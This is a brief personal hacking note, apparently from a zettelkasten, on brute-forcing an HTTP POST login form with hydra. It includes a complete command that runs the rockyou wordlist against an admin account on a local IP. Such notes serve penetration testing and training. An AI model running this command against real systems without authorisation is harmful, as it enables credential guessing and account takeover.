# hydra brute force HTTP Post Request
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use https-post-form instead of http-post-form for HTTPS sites.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```

# Related
- [20221003150744](/zet/20221003150744/README.md) hydra brute force
- ~/kb/hacking/commands/hydra.md

Tags:
    #assorted #command #hacking #hydra
